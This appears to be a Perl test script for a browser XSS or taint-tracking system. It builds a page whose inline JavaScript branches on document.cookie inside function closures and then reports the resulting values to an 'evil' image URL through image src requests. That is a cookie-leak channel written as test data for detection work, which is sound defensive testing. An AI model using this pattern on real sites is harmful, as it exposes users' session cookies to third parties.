#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_CLOSURE";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var url = "";
		var evil = 3;
		if ($evil) {
			evil = 4;
		}
		
		// shouldn't be evil
		
		var notevil = 42;
		function testfunc(test) {
			notevil = 40;
		}		
		testfunc(notevil);
		url = "$imgevilurl?normal=" + notevil; 
		document.images[0].src = url;
		
		// if with evil val
		
		var notevil2 = 42;
		function testfunc2(test) {
			notevil2 = 41;
		}
		if ($evil) {
			function testfunc2(test) {
				notevil2 = 43;
			}
		}
		testfunc2(notevil);
		url = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url;
		
		// normal usage
		
		var notevil3 = 42;
		if (evil) {
			function testfunc3(test) {
				notevil3 = 43;
			}
		}
		testfunc3(notevil3);
		url = "$imgevilurl?isevil=" + notevil3;
		document.images[2].src = url;
		
    </script>
|;

require "xss_basic_footer.pl";